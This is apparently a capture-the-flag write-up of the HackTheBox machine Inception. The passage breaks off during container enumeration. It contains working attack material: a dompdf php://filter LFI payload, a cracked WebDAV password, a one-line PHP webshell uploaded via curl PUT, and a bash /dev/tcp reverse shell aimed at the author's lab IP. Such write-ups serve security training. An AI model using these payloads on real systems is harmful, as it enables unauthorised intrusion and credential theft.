---
title: HTB: Inception
url: https://0xdf.gitlab.io/2022/04/04/htb-inception.html
date: 2022-04-04T09:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, hackthebox, htb-inception, nmap, dompdf, feroxbuster, squid, proxychains, wfuzz, container, lxd, php-filter, webdav, davtest, wireshark, webshell, forward-shell, wordpress, ping-sweep, tftp, apt, apt-pre-invoke, youtube, htb-joker, htb-granny
---

![Inception](https://0xdfimages.gitlab.io/img/inception-cover.png)

Inception was one of the first boxes on HTB that used containers. I’ll start by exploiting a dompdf WordPress plugin to get access to files on the filesystem, which I’ll use to identify a WedDAV directory and credentials. I’ll abuse WebDAV to upload a webshell, and get a foothold in a container. Unfortunately, outbound traffic is blocked, so I can’t get a reverse shell. I’ll write a forward shell in Python to get a solid shell. After some password reuse and sudo, I’ll have root in the container. Looking at the host, from the container I can access FTP and TFTP. Using the two I’ll identify a cron running apt update, and write a pre-invoke script to get a shell.

## Box Info

| Name | [Inception](https://hackthebox.com/machines/inception)  [Inception](https://hackthebox.com/machines/inception) [Play on HackTheBox](https://hackthebox.com/machines/inception) |
| --- | --- |
| Release Date | [02 Dec 2017](https://twitter.com/hackthebox_eu/status/936566623347052544) |
| Retire Date | 14 Apr 2018 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Inception |
| Radar Graph | Radar chart for Inception |
| First Blood User | 00:55:41[m0noc m0noc](https://app.hackthebox.com/users/4365) |
| First Blood Root | 07:26:06[overcast overcast](https://app.hackthebox.com/users/9682) |
| Creator | [rsp3ar rsp3ar](https://app.hackthebox.com/users/1498) |

## Recon

### nmap

`nmap` finds two open TCP ports, HTTP (80) and Squid Proxy (3128):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.67
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-25 20:33 UTC
Nmap scan report for 10.10.10.67
Host is up (0.090s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3128/tcp open  squid-http

Nmap done: 1 IP address (1 host up) scanned in 13.56 seconds
oxdf@hacky$ nmap -p 80,3128 -sCV -oA scans/nmap-tcpscripts 10.10.10.67
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-25 20:34 UTC
Nmap scan report for 10.10.10.67
Host is up (0.087s latency).

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.03 seconds

```

Based on the [Apache](https://packages.ubuntu.com/search?keywords=apache2) version, the host is likely running Ubuntu 16.04 xenial.

### Website - TCP 80

#### Site

The site just has a form asking for an email address:

![image-20220325163714494](https://0xdfimages.gitlab.io/img/image-20220325163714494.png)

When I put an email in and click “Sign Up”, it says thank you:

![image-20220325163836147](https://0xdfimages.gitlab.io/img/image-20220325163836147.png)

But looking in Burp, no requests were sent. A quick peak at the JS source in Firefox dev tools shows it “doesn’t actually do anything yet”:

[![image-20220325164009230](https://0xdfimages.gitlab.io/img/image-20220325164009230.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220325164009230.png)

While I’m in dev tools, I’ll take a look at the source, and something jumps out:

![image-20220325164103689](https://0xdfimages.gitlab.io/img/image-20220325164103689.png)

It’s actually convenient to notice that in dev tools, as if I look at the raw source, it would show 1000 empty lines pushing this comment way down the page. I wouldn’t expect to see this in a modern HackTheBox machine, but unrealistic elements like hiding hints to players in the HTML source comments were more common in the earlier boxes.

#### Tech Stack

The HTTP response headers show Apache, but not much else of interest:

```

HTTP/1.1 200 OK
Date: Fri, 25 Mar 2022 20:36:43 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Mon, 06 Nov 2017 08:36:43 GMT
ETag: "b3d-55d4c5aaad546-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 2877
Connection: close
Content-Type: text/html

```

Trying `/index.html` loads the same page, so no hint about what framework (if any) the site is written in. It could just be a static site. Still, the comment in the source suggested it could be running PHP 7.x.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` given the hint there, but it finds nothing of interest:

```

oxdf@hacky$ feroxbuster -u http://10.10.10.67 -x php -t 100

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.67
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      311c http://10.10.10.67/images => http://10.10.10.67/images/
301      GET        9l       28w      311c http://10.10.10.67/assets => http://10.10.10.67/assets/
301      GET        9l       28w      317c http://10.10.10.67/assets/fonts => http://10.10.10.67/assets/fonts/
301      GET        9l       28w      314c http://10.10.10.67/assets/js => http://10.10.10.67/assets/js/
[####################] - 27s   299990/299990  0s      found:4       errors:135357 
[####################] - 21s    59998/59998   2838/s  http://10.10.10.67 
[####################] - 20s    59998/59998   3025/s  http://10.10.10.67/images 
[####################] - 19s    59998/59998   3315/s  http://10.10.10.67/assets 
[####################] - 19s    59998/59998   3277/s  http://10.10.10.67/assets/fonts 
[####################] - 20s    59998/59998   2900/s  http://10.10.10.67/assets/js 

```

#### /dompdf

The hint about dompdf suggests some use of [this](https://github.com/dompdf/dompdf), a HTML to PDF converter written in PHP. Given this is meant to live on a website, I’ll try `/dompdf`, and it returns a directory:

![image-20220325164953837](https://0xdfimages.gitlab.io/img/image-20220325164953837.png)

The version file returns “0.6.0”.

### Squid - TCP 3128

#### Enumeration

Squid proxy is something I’ve written about [before](/tags#squid). I’ll set up a FoxyProxy profile to have Firefox use it:

![image-20220325171624131](https://0xdfimages.gitlab.io/img/image-20220325171624131.png)

Then activating that, I’ll try to visit the same page, and it returns “Access Denied.”:

![image-20220325171657889](https://0xdfimages.gitlab.io/img/image-20220325171657889.png)

Interestingly, 127.0.0.1 works:

![image-20220325171811113](https://0xdfimages.gitlab.io/img/image-20220325171811113.png)

#### Fuzz Local Ports

Since I can access port 80 on localhost, I’ll see what else is there with `wfuzz`. I’ll use `-z range,[start]-[finish]` as the payload to go over a range, and then full the URL `http://127.0.0.1:FUZZ`. I’ll start with a small range that includes 80 so I can see what success and failures look like:

```

oxdf@hacky$ wfuzz -u http://127.0.0.1:FUZZ -z range,75-85 -p 10.10.10.67:3128:HTTP
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://127.0.0.1:FUZZ/
Total requests: 11

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000001:   503        146 L    399 W    3638 Ch     "75"
000000002:   503        146 L    399 W    3638 Ch     "76"
000000003:   503        146 L    399 W    3638 Ch     "77"
000000004:   503        146 L    399 W    3638 Ch     "78"
000000005:   503        146 L    399 W    3638 Ch     "79"
000000007:   503        146 L    399 W    3638 Ch     "81"
000000009:   503        146 L    399 W    3638 Ch     "83"
000000006:   200        1051 L   169 W    2877 Ch     "80"
000000008:   503        146 L    399 W    3638 Ch     "82"
000000010:   503        146 L    399 W    3638 Ch     "84"
000000011:   503        146 L    399 W    3638 Ch     "85"

Total time: 0.270905
Processed Requests: 11
Filtered Requests: 0
Requests/sec.: 40.60460

```

Assuming that all those ports are closed except 80, it looks like a 503 response or length 3638 characters / 399 words indicates a closed port. It turns out that length changes based on the length of the port, so character count is an unreliable filter. I can I’ll filter those out with `--hw 399` or `--hc 503`, and run over all ports:

```

oxdf@hacky$ wfuzz -u http://127.0.0.1:FUZZ -z range,1-65535 -p 10.10.10.67:3128:HTTP --hw 399
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://127.0.0.1:FUZZ/
Total requests: 65535

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000022:   200        2 L      4 W      60 Ch       "22"
000000080:   200        1051 L   169 W    2877 Ch     "80"
000003128:   400        151 L    416 W    3521 Ch     "3128"

Total time: 145.3158
Processed Requests: 65535
Filtered Requests: 65532
Requests/sec.: 450.9831

```

It finds 22 (presumably SSH), and the two ports I know about (80 and 3128).

### SSH - TCP 22 (localhost only)

I can test the SSH access using `proxychains`. I’ll open `/etc/proxychains4.conf` and go to the very bottom, changing the proxylist to:

```

[ProxyList]
http    10.10.10.67 3128

```

Now I’ll run `ssh` through that proxy, and it works:

```

oxdf@hacky$ proxychains ssh root@localhost
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  10.10.10.67:3128  ...  127.0.0.1:22  ...  OK
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
root@localhost's password:

```

Without a password for root, or even a list of usernames, there’s not much I can do now. But I’ll keep this in mind for later.

## Shell as www-data in Container

### CVE-2014-2383 - LFI

#### POC

Some Googling for dompdf 0.6.0 returns this [exploitdb](https://www.exploit-db.com/exploits/33004) page suggesting there’s an LFI in this version. It says to visit:

```

http://example/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>

```

It’s requesting a file with the `input_file` argument and using PHP filters to return the file base64-encoded, which is worth keeping in mind.

If I visit without the filter, it doesn’t return anything. But with the filter, it returns a PDF with a single base64-encoded string. For example:

```

http://127.0.0.1/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd

```

Visiting returns:

![image-20220325173440997](https://0xdfimages.gitlab.io/img/image-20220325173440997.png)

I’ll copy that string and decode it:

```

oxdf@hacky$ echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwMzpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDU6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzbG9nOng6MTA0OjEwODo6L2hvbWUvc3lzbG9nOi9iaW4vZmFsc2UKX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKc3NoZDp4OjEwNjo2NTUzNDo6L3Zhci9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpjb2JiOng6MTAwMDoxMDAwOjovaG9tZS9jb2JiOi9iaW4vYmFzaAo=" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
cobb:x:1000:1000::/home/cobb:/bin/bash

```

#### File System Enum - Fails

There are several things I’ll try that won’t result in anything. For example, in [Joker](/2020/08/13/htb-joker.html#tftp---udp-69), I was able to read `/etc/squid/squid.conf` to get the location of the file containing the passwords used to authenticate to the proxy. I was able to get that config here, but it was largely default. The section defining auth had the line to the password file incomplete:

[![image-20220325215841534](https://0xdfimages.gitlab.io/img/image-20220325215841534.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220325215841534.png)

Any reads out of `/home/cobb` just failed, presumably because the www-data user doesn’t have access to that directory.

#### WebServer Config

Without getting much from Squid, I’ll look at the webserver. The config files for sites in Apache are stored in `/etc/apache2/sites-enabled`. The default file name of `000-default.conf` works (some of the comments are removed for clarity here):

```

<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        Alias /webdav_test_inception /var/www/html/webdav_test_inception
        <Location /webdav_test_inception>
                Options FollowSymLinks
                DAV On
                AuthType Basic
                AuthName "webdav test credential"
                AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
                Require valid-user
        </Location>
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

The document root is the default, `/var/www/html`, but there’s also this WebDav location, with a `AuthUserFile` path given. Fetching that file returns a username and hash:

```

webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0

```

### Crack Password

I’ll pass this to `hashcat` to try to crack the hash. The password file works fine in that format, as long as I give `--user` so it knows to skip the username and colon. With the newest `hashcat`, it will detect the type of hash automatically, and it cracked very quickly:

```

# /opt/hashcat-6.2.5/hashcat.bin webdav.passwd rockyou.txt --user
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR) | FTP, HTTP, SMTP, LDAP Server
...[snip]...
$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0:babygurl69           
...[snip]...

```

### Webshell via WebDAV

#### WebDAV Background

I write about WebDAV in March 2019 in a [Granny writeup](/2019/03/06/htb-granny.html#background) as:

> Web Distributed Authoring and Versioning (WebDAV) is an HTTP extension designed to allow people to create and modify web sites using HTTP. It was originally started in 1996, when this didn’t seem like a terrible idea. I don’t see that often on recent HTB machines, but I did come across it in PWK/OSCP.

HTTP has a handful of verbs used for request. The most common are GET and POST, and to a lesser extent HEAD, PUT and OPTIONS. [Mozilla docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods) show those plus DELETE, CONNECT, TRACE, and PATCH.

WebDAV extends HTTP further, offering COPY, LOCK, MKCOL, MOVE, PROPFILE, PROPPATCH, and UNLOCK. This diagram from the [WebDAV Wikipedia page](https://en.wikipedia.org/wiki/WebDAV) shows how the process could work:

[![](https://0xdfimages.gitlab.io/img/webdav.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/webdav.png)

Note the arrows show the direction of the content, but all five requests are initiated from the client. This flow shows how a client would remotely edit a website.

#### davtest

[davtest](https://github.com/cldrn/davtest) is a old but useful tool for enumerating WebDAV. On Parrot or Kali it can be installed with `apt install davtest`.

Running it on the webroot just returns that the OPEN test failed with a 405 Method Not Allowed:

```

oxdf@hacky$ davtest -url http://10.10.10.67
********************************************************
 Testing DAV connection
OPEN            FAIL:   http://10.10.10.67      Server response: 405 Method Not Allowed

```

I’m confused as to what OPEN means, but running this again while watching in Wireshark shows it’s just running the PROPFIND verb:

[![image-20220327065049339](https://0xdfimages.gitlab.io/img/image-20220327065049339.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220327065049339.png)

Trying again on the path from the config, it returns a new error, Unauthorized:

```

oxdf@hacky$ davtest -url http://10.10.10.67/webdav_test_inception
********************************************************
 Testing DAV connection
OPEN            FAIL:   http://10.10.10.67/webdav_test_inception        Unauthorized. Basic realm="webdav test credential"

```

Adding in the creds from the config and cracked hash, it works and shows which kinds of files can be put, and which ones can be executed:

```

oxdf@hacky$ davtest.pl -url http://10.10.10.67/webdav_test_inception -auth webdav_tester:babygurl69
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.67/webdav_test_inception
********************************************************
NOTE    Random string for this session: TCjeb2H1IV1VIUl
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl
********************************************************
 Sending test files
PUT     cgi     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.cgi
PUT     php     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.php
PUT     cfm     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.cfm
PUT     aspx    SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.aspx
PUT     pl      SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.pl
PUT     asp     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.asp
PUT     txt     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.txt
PUT     html    SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.html
PUT     jhtml   SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.jhtml
PUT     jsp     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.jsp
PUT     shtml   SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.shtml
********************************************************
 Checking for test file execution
EXEC    cgi     FAIL
EXEC    php     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.php
EXEC    php     FAIL
EXEC    cfm     FAIL
EXEC    aspx    FAIL
EXEC    pl      FAIL
EXEC    asp     FAIL
EXEC    txt     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.txt
EXEC    txt     FAIL
EXEC    html    SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.html
EXEC    html    FAIL
EXEC    jhtml   FAIL
EXEC    jsp     FAIL
EXEC    shtml   FAIL
********************************************************
./davtest.pl Summary:
Created: http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.cgi
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.php
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.cfm
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.aspx
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.pl
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.asp
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.txt
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.html
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.jhtml
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.jsp
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.shtml
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.php
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.txt
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_TCjeb2H1IV1VIUl/davtest_TCjeb2H1IV1VIUl.html

```

It’s able to upload all kinds of files, and the PHP one executed! It’s worth nothing when using a tool like `davtest` that while it seems like enumeration, it is executing on the target machine, so make sure the target is within scope and you have permission to be running it (not something I have to worry about in HTB).

#### Upload Webshell

I’ll create a simple PHP webshell, and use `curl` to PUT it onto Inception:

```

oxdf@hacky$ echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
oxdf@hacky$ curl -X PUT http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/0xdf.php -d @shell.php 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav_test_inception/0xdf.php has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.67 Port 80</address>
</body></html>

```

It reports to create the file. Testing this, the file is there and it executes:

```

oxdf@hacky$ curl http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/0xdf.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

To make running more complicated commands work, I’ll move to a POST request and have `curl` manage the encoding:

```

oxdf@hacky$ curl --data-urlencode 'cmd=id' http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/0xdf.php
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Reverse Shell Fail

#### Identify Failure

From the webshell, my standard move is to get a reverse shell and use it to continue enumerating and escalating privileges. I’ll start `nc` listening on TCP 443 on my host, and run the a [Bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw)):

```

oxdf@hacky$ curl --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"' http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/0xdf.php

```

It hangs for a long time (eventually returning nothing), but there’s no connection at `nc`.

When I get an issue like this, there are a few things that come to mind that it could be:
- Is the shell working? Are there any bad characters being misinterpreted?
- Is it a networking issue? Could a firewall be blocking outbound traffic?

#### Check Networking

To start, I’ll go back to simpler building blocks. For example, can I `ping` my host, or just connect to it with `nc` or `curl`? I’ll start with `ping`, using `tcpdump -ni tun0 icmp` on my local box to listening for pings, and in another terminal:

```

oxdf@hacky$ curl --data-urlencode 'cmd=ping -c 2 10.10.14.6' http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/0xdf.php
PING 10.10.14.6 (10.10.14.6) 56(84) bytes of data.
--- 10.10.14.6 ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 1007ms

```

Two packets sent, neither came back. This is looking like a firewall issue. I can test further. `nc` is on the box:

```

oxdf@hacky$ curl --data-urlencode 'cmd=which nc' http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/0xdf.php
/bin/nc

```

Can I just `nc` to a listener on my host:

```

oxdf@hacky$ curl --data-urlencode 'cmd=nc 10.10.14.6 443 2>&1' http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/0xdf.php

```

Just like the reverse shell, it hangs and eventually returns nothing.

I could try other ports, or even loop over different ports trying to connect back. In this case, I think I’ve found that there’s no outbound traffic.

### Forward Shell

#### Background

I could probably live with my webshell, or upload a more functional one, but not wanting to pass up a chance to practice Python, I’ll develop a forward shell. I recently did a [video](https://www.youtube.com/watch?v=-ST2FSbqEcU) explaining how this works:

#### Building

I’ll start from an empty file and build out a forward shell. To see the process, check out [this video](https://www.youtube.com/watch?v=ny9MWj6XML4):

The final script is available [here](/files/inception-forwardshell.py).

When I run it, it’s got everything but tab-completion:

```

oxdf@hacky$ python3 fshell.py 
Starting forward shell with session 80412
Webshell uploaded to http://10.10.10.67/webdav_test_inception/0xdf-80412.php
Forward shell initiated
Inception> upgrade
Script started, file is /dev/null
www-data@Inception:/var/www/html/webdav_test_inception$ stty raw -echo
www-data@Inception:/var/www/html/webdav_test_inception$ ls
0xdf-29705.php  0xdf-80412.php  webdav.passwd
www-data@Inception:/var/www/html/webdav_test_inception$ pwd
/var/www/html/webdav_test_inception

```

## Shell as cobb in Container

### Enumeration

#### Home Directory

There’s only one home directory, cobb:

```

www-data@Inception:/home$ ls
cobb
www-data@Inception:/home/cobb$ ls -la
total 36
drwxr-xr-x 3 cobb cobb 4096 Nov 30  2017 .
drwxr-xr-x 3 root root 4096 Nov  6  2017 ..
-rw------- 1 root root 1326 Nov 30  2017 .bash_history
-rw-r--r-- 1 cobb cobb  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 cobb cobb 3771 Aug 31  2015 .bashrc
drwx------ 2 cobb cobb 4096 Nov  6  2017 .cache
-rw-r--r-- 1 cobb cobb  655 May 16  2017 .profile
-rw-r--r-- 1 cobb cobb    0 Nov  6  2017 .sudo_as_admin_successful
-rw------- 1 cobb cobb 3642 Nov 30  2017 .viminfo
-r-------- 1 cobb cobb   33 Nov  6  2017 user.txt

```

It has `user.txt`, but I can’t read it as www-data.

#### Container

The hostname for this box is Inception, but the IP is not 10.10.10.67, or even in that subnet:

```

www-data@Inception:/home$ ifconfig
